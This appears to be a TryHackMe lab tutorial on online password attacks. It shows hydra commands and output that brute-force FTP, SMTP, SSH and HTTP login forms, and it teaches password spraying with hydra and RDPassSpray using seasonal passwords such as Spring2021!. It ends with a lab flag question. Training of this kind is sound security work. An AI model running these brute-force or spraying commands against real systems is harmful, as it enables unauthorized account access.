<p>Online password attacks involve guessing passwords for networked services that use a username and password authentication scheme, including services such as&nbsp;HTTP, SSH, VNC, FTP, SNMP, POP3, etc. This section showcases using&nbsp;hydra&nbsp;which is a common tool used in attacking logins for various network services.</p>
<p>Hydra</p>
<p>Hydra supports an extensive list of network services to attack. Using hydra, we'll brute-force network services such as web login pages,&nbsp;FTP, SMTP, and SSH in this section.&nbsp;Often, within hydra, each service has its own options and the syntax hydra expects takes getting used to. It's important to check the help options for more information and features.</p>
<p>FTP</p>
<p>In the following scenario, we will perform a brute-force attack against an&nbsp;FTP&nbsp;server. By checking the&nbsp;hydra&nbsp;help options, we know the syntax of attacking the&nbsp;FTP&nbsp;server is as follows:</p>
<p>FTP</p>
<pre><code class="language-plaintext">user@machine$ hydra -l ftp -P passlist.txt ftp://10.10.x.x</code></pre>
<p>-l ftp&nbsp;we are specifying a single username, use-L&nbsp;for a username wordlist</p>
<p>-P Path&nbsp;specifying the full path of wordlist, you can specify a single password by&nbsp;using&nbsp;-p.</p>
<p>ftp://10.10.x.x&nbsp;the protocol and the IP address or the fully qualified domain name (FDQN) of the target.</p>
<p>Remember that sometimes you don't need to brute-force and could first try default credentials.&nbsp;Try to attack the&nbsp;FTP&nbsp;server on the attached VM and answer the question below.</p>
<p>SMTP</p>
<p>Similar to FTP&nbsp;servers, we can also brute-force SMTP servers using hydra. The syntax is similar to the previous example. The only difference is the targeted protocol. Keep in mind, if you want to try other online password attack tools, you may need to specify the port number, which is 25. Make sure to read the help options of the tool.</p>
<p>SMTP</p>
<pre><code class="language-plaintext">user@machine$ hydra -l email@company.xyz -P /path/to/wordlist.txt smtp://10.10.x.x -v 
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-10-13 03:41:08
[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
[DATA] max 7 tasks per 1 server, overall 7 tasks, 7 login tries (l:1/p:7), ~1 try per task
[DATA] attacking smtp://10.10.x.x:25/
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[VERBOSE] using SMTP LOGIN AUTH mechanism
[VERBOSE] using SMTP LOGIN AUTH mechanism
[VERBOSE] using SMTP LOGIN AUTH mechanism
[VERBOSE] using SMTP LOGIN AUTH mechanism
[VERBOSE] using SMTP LOGIN AUTH mechanism
[VERBOSE] using SMTP LOGIN AUTH mechanism
[VERBOSE] using SMTP LOGIN AUTH mechanism
[25][smtp] host: 10.10.x.x   login: email@company.xyz password: xxxxxxxx
[STATUS] attack finished for 10.10.x.x (waiting for children to complete tests)
1 of 1 target successfully completed, 1 valid password found</code></pre>
<p>SSH</p>
<p>SSH brute-forcing can be common if your server is accessible to the Internet. Hydra supports many protocols, including SSH. We can use the previous syntax to perform our attack! It's important to notice that password attacks rely on having an excellent wordlist to increase your chances of finding a valid username and password.</p>
<p>SSH</p>
<pre><code class="language-plaintext">user@machine$ hydra -L users.lst -P /path/to/wordlist.txt ssh://10.10.x.x -v
 
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes. 

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-10-13 03:48:00
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 8 tasks per 1 server, overall 8 tasks, 8 login tries (l:1/p:8), ~1 try per task
[DATA] attacking ssh://10.10.x.x:22/
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[INFO] Testing if password authentication is supported by ssh://user@10.10.x.x:22
[INFO] Successful, password authentication is supported by ssh://10.10.x.x:22
[22][ssh] host: 10.10.x.x   login: victim   password: xxxxxxxx
[STATUS] attack finished for 10.10.x.x (waiting for children to complete tests)
1 of 1 target successfully completed, 1 valid password found</code></pre>
<p>HTTP login pages</p>
<p>In this scenario, we will brute-force&nbsp;HTTP login pages. To do that, first, you need to understand what you are brute-forcing. Using hydra, it is important to specify the type of HTTP request, whether&nbsp;GET&nbsp;or&nbsp;POST. Checking hydra options:&nbsp;hydra http-get-form -U, we can see that hydra has the following syntax for the&nbsp;http-get-form&nbsp;option:</p>
<p>&lt;url&gt;:&lt;form parameters&gt;:&lt;condition string&gt;[:&lt;optional&gt;[:&lt;optional&gt;]</p>
<p>As we mentioned earlier, we need to analyze the&nbsp;HTTP&nbsp;request that we need to send, and that could be done either by using your browser dev tools or using a web proxy such as Burp Suite.</p>
<p>hydra</p>
<pre><code class="language-plaintext">user@machine$ hydra -l admin -P 500-worst-passwords.txt 10.10.x.x http-get-form "/login-get/index.php:username=^USER^&amp;password=^PASS^:S=logout.php" -f 
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes. 

Hydra (http://www.thc.org/thc-hydra) starting at 2021-10-13 08:06:22 
[DATA] max 16 tasks per 1 server, overall 16 tasks, 500 login tries (l:1/p:500), ~32 tries per task 
[DATA] attacking http-get-form://10.10.x.x:80//login-get/index.php:username=^USER^&amp;password=^PASS^:S=logout.php 
[80][http-get-form] host: 10.10.x.x   login: admin password: xxxxxx 
1 of 1 target successfully completed, 1 valid password found 
Hydra (http://www.thc.org/thc-hydra) 
finished at 2021-10-13 08:06:45</code></pre>
<p>-l admin&nbsp; we are specifying a single username, use-L&nbsp;for a username wordlist</p>
<p>-P Path&nbsp;specifying the full path of wordlist, you can specify a single password by&nbsp;using&nbsp;-p.</p>
<p>10.10.x.x&nbsp;the IP address or the fully qualified domain name (FQDN) of the target.</p>
<p>http-get-form&nbsp;the type of HTTP request, which can be either&nbsp;http-get-form&nbsp;or&nbsp;http-post-form.</p>
<p>Next, we specify the URL, path, and conditions that are split using&nbsp;:</p>
<p>login-get/index.php&nbsp;the path of the login page on the target webserver.</p>
<p>username=^USER^&amp;password=^PASS^&nbsp;the parameters to brute-force, we inject&nbsp;^USER^&nbsp;to brute force usernames and&nbsp;^PASS^&nbsp;for passwords from the specified dictionary.</p>
<p>The following section is important to eliminate false positives by specifying the 'failed' condition with&nbsp;F=.</p>
<p>And success conditions,&nbsp;S=.&nbsp;You will have more information about these conditions by analyzing the webpage or in the enumeration stage!&nbsp;What you set for these values depends on the response you receive back from the server for a failed login attempt and a successful login attempt. For example, if you receive a message on the webpage 'Invalid password' after a failed login, set&nbsp;F=Invalid Password.</p>
<p>Or for example, during the enumeration, we found that the webserver serves&nbsp;logout.php. After logging into the login page with valid credentials, we could guess that we will have&nbsp;logout.php&nbsp;somewhere on the page. Therefore, we could tell hydra to look for the text&nbsp;logout.php&nbsp;within the HTML for every request.</p>
<p>S=logout.php&nbsp;the success condition to identify the valid credentials</p>
<p>-f&nbsp;to stop the brute-forcing attacks after finding a valid username and password</p>
<p>You can try it out on the attached VM by visiting&nbsp;http://MACHINE_IP/login-get/index.php. Make sure to deploy the attached VM&nbsp;if you haven't already to answer the questions below.</p>
<p>Finally, it is worth it to check other online password attacks tools to expand your knowledge, such as:</p>
<ul>
  <li>Medusa</li>
  <li>Ncrack</li>
  <li>others!</li>
</ul>
<h1>Password spray attack</h1>
<p>This task will teach the fundamentals of a password spraying attack and the tools needed to perform various attack scenarios against common online services.</p>
<p>Password Spraying is an effective technique used to identify valid credentials. Nowadays, password spraying is considered one of the common password attacks for discovering weak passwords. This technique can be used against various online services and authentication systems, such as SSH, SMB, RDP, SMTP, Outlook Web Application, etc. A brute-force attack targets a specific username to try many weak and predictable passwords. While a password spraying attack targets many usernames using one common weak password, which could help avoid an account lockout policy. The following figure explains the concept of password spraying attacks where the attacker utilizes one common password against multiple users.</p>
<figure class="image image_resized" style="width:943px;"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/17bdbbc66c5924d99823be70e98832ed.png"></figure>
<p style="text-align:center;"><br>&nbsp;</p>
<p>&nbsp;</p>
<p>Common and weak passwords often follow a pattern and format. Some commonly used passwords and their overall format can be found below.</p>
<ul>
  <li>The current season followed by the current year (SeasonYear). For example, <strong>Fall2020</strong>, <strong>Spring2021</strong>, etc.</li>
  <li>The current month followed by the current year (MonthYear). For example, <strong>November2020</strong>, <strong>March2021</strong>, etc.</li>
  <li>Using the company name along with random numbers (CompanyNameNumbers). For example,&nbsp;<strong>TryHackMe01</strong>,&nbsp;<strong>TryHackMe02</strong>.<br>&nbsp;</li>
</ul>
<p>If a password complexity policy is enforced within the organization, we may need to create a password that includes symbols to fulfill the requirement, such as&nbsp;October2021!,&nbsp;Spring2021!,&nbsp;October2021@,&nbsp;etc.&nbsp;<strong>To be successful in the password spraying attack, we need to enumerate the target and create a list of valid usernames (or email addresses list)</strong>.</p>
<p>Next, we will apply the password spraying technique using different scenarios against various services, including:</p>
<p>&nbsp;</p>
<ul>
  <li>SSH</li>
  <li>RDP</li>
  <li>Outlook web access (OWA) portal<br>&nbsp;</li>
  <li>SMB</li>
</ul>
<h3>SSH</h3>
<p>Assume that we have already enumerated the system and created a valid username list.</p>
<p>Hashcat</p>
<pre><code class="language-plaintext">user@THM:~# cat usernames-list.txt
admin
victim
dummy
adm
sammy
</code></pre>
<p>Here we can use&nbsp;hydra&nbsp;to perform the password spraying attack against the SSH service using the&nbsp;Spring2021&nbsp;password.</p>
<p>Hashcat</p>
<pre><code class="language-plaintext">user@THM:~$ hydra -L usernames-list.txt -p Spring2021 ssh://10.1.1.10
[INFO] Successful, password authentication is supported by ssh://10.1.1.10:22
[22][ssh] host: 10.1.1.10 login: victim password: Spring2021
[STATUS] attack finished for 10.1.1.10 (waiting for children to complete tests)
1 of 1 target successfully completed, 1 valid password found
</code></pre>
<p>Note that&nbsp;L&nbsp;is to load the list of valid usernames, and&nbsp;-p&nbsp;uses the&nbsp;Spring2021&nbsp;password against the SSH service at&nbsp;10.1.1.10. The above output shows that we have successfully found credentials.</p>
<h3>RDP</h3>
<p>Let's assume that we found an exposed RDP service on port 3026. We can use a tool such as&nbsp;<a href="https://github.com/xFreed0m/RDPassSpray">RDPassSpray</a>&nbsp;to password spray against RDP. First, install the tool on your attacking machine by following the installation instructions in the tool’s GitHub repo. As a new user of this tool, we will start by executing the&nbsp;python3 RDPassSpray.py -h&nbsp;command to see how the tools can be used:</p>
<p>Hashcat</p>
<pre><code class="language-plaintext">user@THM:~# python3 RDPassSpray.py -h
usage: RDPassSpray.py [-h] (-U USERLIST | -u USER  -p PASSWORD | -P PASSWORDLIST) (-T TARGETLIST | -t TARGET) [-s SLEEP | -r minimum_sleep maximum_sleep] [-d DOMAIN] [-n NAMES] [-o OUTPUT] [-V]

optional arguments:
  -h, --help            show this help message and exit
  -U USERLIST, --userlist USERLIST
                        Users list to use, one user per line
  -u USER, --user USER  Single user to use
  -p PASSWORD, --password PASSWORD
                        Single password to use
  -P PASSWORDLIST, --passwordlist PASSWORDLIST
                        Password list to use, one password per line
  -T TARGETLIST, --targetlist TARGETLIST
                        Targets list to use, one target per line
  -t TARGET, --target TARGET
                        Target machine to authenticate against
  -s SLEEP, --sleep SLEEP
                        Throttle the attempts to one attempt every # seconds, can be randomized by passing the value 'random' - default is 0
  -r minimum_sleep maximum_sleep, --random minimum_sleep maximum_sleep
                        Randomize the time between each authentication attempt. Please provide minimun and maximum values in seconds
  -d DOMAIN, --domain DOMAIN
                        Domain name to use
  -n NAMES, --names NAMES
                        Hostnames list to use as the source hostnames, one per line
  -o OUTPUT, --output OUTPUT
                        Output each attempt result to a csv file
  -V, --verbose         Turn on verbosity to show failed attempts
</code></pre>
<p>Now, let's try using the (-u) option to specify the&nbsp;victim&nbsp;as a username and the (-p) option set the&nbsp;Spring2021!. The (-t) option is to select a single host to attack.</p>
<p>Hashcat</p>
<pre><code class="language-plaintext">user@THM:~# python3 RDPassSpray.py -u victim -p Spring2021! -t 10.100.10.240:3026
[13-02-2021 16:47] - Total number of users to test: 1
[13-02-2021 16:47] - Total number of password to test: 1
[13-02-2021 16:47] - Total number of attempts: 1
[13-02-2021 16:47] - [*] Started running at: 13-02-2021 16:47:40
[13-02-2021 16:47] - [+] Cred successful (maybe even Admin access!): victim :: Spring2021!
</code></pre>
<p>The above output shows that we successfully found valid credentials&nbsp;victim:Spring2021!.&nbsp;Note that we can specify a domain name using the&nbsp;-d&nbsp;option if we are in an Active Directory environment.</p>
<p>Hashcat</p>
<pre><code class="language-plaintext">user@THM:~# python3 RDPassSpray.py -U usernames-list.txt -p Spring2021! -d THM-labs -T RDP_servers.txt</code></pre>
<p>There are various tools that perform a spraying password attack against different services, such as:</p>
<h3>Outlook web access (OWA) portal</h3>
<p>Tools:</p>
<ul>
  <li><a href="https://github.com/byt3bl33d3r/SprayingToolkit">SprayingToolkit</a>&nbsp;(atomizer.py)</li>
  <li><a href="https://github.com/dafthack/MailSniper">MailSniper</a></li>
</ul>
<h3>SMB</h3>
<ul>
  <li>Tool: Metasploit (auxiliary/scanner/smb/smb_login)</li>
</ul>
<p><strong>Answer the questions below</strong></p>
<p>Use the following username list:</p>
<p>Password spraying attack!</p>
<pre><code class="language-plaintext">user@THM:~# cat usernames-list.txt 
admin
phillips
burgess
pittman
guess</code></pre>
<p>Perform a&nbsp;password spraying attack&nbsp;to get access to the&nbsp;SSH://MACHINE_IP&nbsp;server to read&nbsp;/etc/flag. <strong>What is the flag?</strong></p>
<p>&nbsp;</p>
